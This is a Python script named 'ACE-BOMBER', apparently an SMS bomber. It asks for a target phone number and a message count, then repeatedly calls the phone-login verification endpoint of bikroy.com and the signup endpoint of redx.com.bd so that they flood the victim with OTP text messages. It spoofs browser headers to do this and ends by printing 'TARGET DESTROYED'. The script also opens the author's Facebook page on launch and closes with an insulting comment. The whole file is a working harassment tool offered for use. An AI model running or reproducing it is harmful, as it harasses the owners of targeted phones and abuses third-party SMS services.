import requests
import time
import os

#THIS WAS CODED BY KANON KHAN
#FOR ANY QUERIES CONTACT THE OWNER 🖤

time.sleep(1)
os.system("clear")
os.system("xdg-open https://www.facebook.com/kanon.khan.754703/")

logo=("""
\033[1;91m
╔════════════════════════════════════════════╗
║   \033[1;92m      WELLCOME TO ACE-BOMBER             \033[1;91m║
╚════════════════════════════════════════════╝

\033[1;92m
     █████╗      ██████╗    ███████╗
    ██╔══██╗    ██╔════╝    ██╔════╝
    ███████║    ██║         █████╗  
    ██╔══██║    ██║         ██╔══╝  
    ██║  ██║    ╚██████╗    ███████╗
    ╚═╝  ╚═╝     ╚═════╝    ╚══════╝      
\x1b[1;91m                   
---------------------------------------
\x1b[1;92m			             
>>  Owner    : ACE		      
>>  Facebook : Kanon Khan	      
>>  Version  : 0.1
\x1b[1;91m---------------------------------------	      	
>>Ｉ　ＦＩＧＨＴ　ＳＯＬＯ　：）<<	   
\x1b[1;91m---------------------------------------   
\033[1;92m>> FOLLOW KANON KHAN ON FACEBOOK <<   
\x1b[1;91m---------------------------------------"""



)


print(logo)


print("WAIT FOR 10 SECOND..... ")
print("THEN PRESS ENTER TO CONTINUE....\033[1;92m")




enter = input()
num = input("\x1b[1;92mTARGET NUMBER :\x1b[1;91m ")
amount=int(input("\x1b[1;92mSMS AMOUNT :\x1b[1;91m "))
delay =int(input("\x1b[1;92mDELAY :\x1b[1;91m "))

print('\x1b[1;91m---------------------------------------')







params = {
    'phone': num,
}

data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}

headers = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'bn',
    'Application-name': 'web',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
   
}

headers2={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}

sent = 0
while amount > sent:
    sms = requests.get(
    'https://bikroy.com/data/phone_number_login/verifications/phone_login',
    params=params,
    headers=headers,
)

    if sms.status_code == 200:
        sent += 1
        print('\x1b[1;92m >>BOOOMMM 🔥')
    
    else:
        pass
        print('\x1b[1;91m >>FAILED 😥')
      
    time.sleep(delay)
    sms2 = requests.post(
        "https://api.redx.com.bd/v1/user/signup",
        headers=headers2,
        data=data
        )
    if sms2.status_code == 200:
        sent += 1
        print('\x1b[1;92m >>BOOOMMM 🔥')
    
    else:
        print('\x1b[1;91m >>FAILED 😥')
     
    time.sleep(delay)
pass

if amount == sent :

	print(""" \033[1;32m                                                         
【 ＴＡＲＧＥＴ　ＤＥＳＴＲＯＹＥＤ 】💀
                                                                                  
                            
THANK YOU FOR USING MY TOOL 🖤
""")
#tor ai khane ki kaj? 🤨
#script churi na koira to nije o sikhte paros madarchod 😑

